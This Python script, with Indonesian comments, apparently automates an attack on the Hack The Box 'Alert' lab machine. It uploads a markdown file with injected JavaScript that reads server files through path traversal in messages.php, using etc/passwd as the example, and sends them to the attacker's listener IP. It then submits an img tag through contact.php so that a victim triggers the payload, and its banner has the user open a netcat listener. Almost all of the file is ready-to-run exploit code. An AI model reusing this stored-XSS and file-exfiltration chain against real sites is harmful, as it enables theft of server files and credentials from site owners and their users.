import requests

# Banner berbentuk naga
def print_banner():
    print("""
                 /\_/\  
           _____/ o o \ 
         /~____  =Ã¸= /   
        (______)__m_m)
        
       Exploit Automation Script
    --------------------------------
    Sebelum menjalankan script ini, jalankan perintah:
    sudo nc -lvnp 80
    --------------------------------
    """)

# Menampilkan banner
print_banner()

# Konfigurasi URL dan endpoint
base_url = "http://alert.htb"
upload_endpoint = f"{base_url}/visualizer.php"
contact_endpoint = f"{base_url}/contact.php"

# Meminta input dari pengguna
file_name = input("Masukkan nama file untuk fetch (contoh: etc/passwd): ")
user_ip = input("Masukkan IP listener Anda: ")

# Membuat konten markdown dinamis berdasarkan input pengguna
markdown_content = f"""
<script>
fetch("http://alert.htb/messages.php?file=../../../../../../../{file_name}")
  .then(response => response.text())
  .then(data => {{
    fetch("http://{user_ip}/?data=" + encodeURIComponent(data));
  }})
  .catch(error => console.error("Error fetching the messages:", error));
</script>
"""

# Membuat payload multipart/form-data
multipart_data = {
    "file": ("payload.md", markdown_content, "text/markdown")
}

# Upload file markdown
print("[*] Uploading markdown...")
upload_response = requests.post(upload_endpoint, files=multipart_data)

if upload_response.status_code == 200:
    print("[+] Markdown uploaded successfully!")
    # Mengambil URL visualizer dari response
    if "link_share=" in upload_response.text:
        start_index = upload_response.text.find("link_share=") + len("link_share=")
        end_index = upload_response.text.find(".md", start_index) + 3
        visualizer_url = f"{base_url}/visualizer.php?link_share={upload_response.text[start_index:end_index]}"
        print(f"[+] Visualizer URL: {visualizer_url}")

        # Membuat payload untuk contact.php
        email = "hackerone1337@wearehackerone.com"
        contact_message = f'<img src="{visualizer_url}" />'
        contact_payload = {
            "email": email,
            "message": contact_message
        }

        # Mengirim pesan ke contact.php
        print("[*] Sending message to contact.php...")
        contact_response = requests.post(contact_endpoint, data=contact_payload)

        if contact_response.status_code == 200:
            print("[+] Message sent successfully via contact.php!")
        else:
            print(f"[-] Failed to send message via contact.php. Status Code: {contact_response.status_code}")
    else:
        print("[-] Failed to extract visualizer URL from response.")
else:
    print(f"[-] Failed to upload markdown. Status Code: {upload_response.status_code}")

